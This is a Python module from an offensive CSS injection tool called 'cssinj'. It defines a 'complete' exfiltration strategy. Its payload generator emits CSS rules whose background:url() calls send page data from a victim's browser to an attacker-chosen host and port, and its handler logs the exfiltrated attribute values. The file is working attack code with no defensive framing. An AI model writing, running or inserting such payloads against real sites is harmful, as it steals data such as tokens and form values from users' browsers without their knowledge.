from cssinj.client import Client
from cssinj.console import Console, LogLevel
from cssinj.strategies.base import BaseExfiltrationStrategy
from cssinj.utils.default import ELEMENTS
from cssinj.utils.dom import Attribute, Element


class CompleteStrategy(BaseExfiltrationStrategy):
    """
    Complete exfiltration strategy.
    Exfiltrates the complete DOM structure of the HTML.
    """

    name = 'complete'

    def __init__(
        self,
        hostname: str,
        port: int,
        element: str = '*',
        attribute: str = 'value',
        timeout: float = 3.0,
    ) -> None:
        super().__init__(hostname, port, element, attribute, timeout)

    def generate_start_payload(self, client: Client) -> str:
        return self._generate_payload(client)

    def generate_next_payload(self, client: Client) -> str:
        return 'next'

    def handle_valid(self, client: Client, data: str) -> str:
        return 'valid'

    def handle_end(self, client: Client) -> str:
        element = Element(name=self.element)
        element.attributes.append(Attribute(name=self.attribute, value=client.data))
        client.elements.append(element)
        Console.log(
            LogLevel.END_EXFILTRATION,
            f'[{client.id}] - The {self.attribute} exfiltrated from {self.element} is : {client.data}',
        )
        client.data = ''
        return 'end'

    def _generate_payload(self, client: Client) -> str:
        elements = ''.join(
            f"html > {element}:nth-child(1){{background:url('//{self.hostname}:{self.port}/e?n={client.counter}&cid={client.id}');}}"
            for element in ELEMENTS
        )
        return elements
